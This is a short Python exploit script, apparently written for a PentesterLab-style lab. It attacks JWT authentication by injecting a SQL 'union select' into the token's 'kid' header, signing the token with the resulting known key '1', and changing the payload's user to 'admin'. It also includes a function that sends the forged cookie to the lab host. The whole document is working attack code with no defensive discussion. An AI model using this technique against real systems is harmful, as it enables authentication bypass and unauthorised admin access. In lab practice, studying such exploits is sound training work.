#select key from keys where kid='key1'
#select key from keys where kid='key1' union select '1'
import urllib.request
import base64
import hmac, hashlib



#data = header +"." + payload
#signature = base64.urlsafe_b64encode(hmac.new(bytes(secret, encoding="utf8"), data.encode('utf-8'), hashlib.sha256).digest()).decode("utf8").rstrip("=")

def decode(string):
    return base64.b64decode(string).decode('utf-8')
def encode(string):
    return base64.urlsafe_b64encode(bytes(string, encoding="utf-8")).decode('utf-8').rstrip("=")
def get_sign(header, payload):
    data = header +"." + payload
    signature = base64.urlsafe_b64encode(hmac.new(bytes("1", encoding="utf8"), data.encode('utf-8'), hashlib.sha256).digest()).decode("utf8").rstrip("=")
    return data+"."+signature


def send(cookies):
    cookie = {"Cookie": "auth=cookie"}
    url ="http://ptl-b78ab3a9-4ccd6cd1.libcurl.so/"
    cookie["Cookie"] = "auth=cookie".replace("cookie", cookies)
    print("Trying - ", cookies)
    try:
        request=urllib.request.Request(url, headers=cookie)
        response=urllib.request.urlopen(request)
        print(response.read())
    except:
        print("Error")


token = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiIsImtpZCI6ImtleTEifQ==.eyJ1c2VyIjpudWxsfQ==.2B9ZKzJ3FeJ9yoNLDGKgcxOuo05PwDRzFQ_34CrGteQ"
header, payload, sign = token.split(".")
dheader = decode(header)
header = dheader.replace("key1", "key1' union select '1")
print(header)
payload = decode(payload).replace("null", '"admin"')
print(payload)
true_cookie = get_sign(encode(header), encode(payload))
print(true_cookie)
#send(true_cookie)
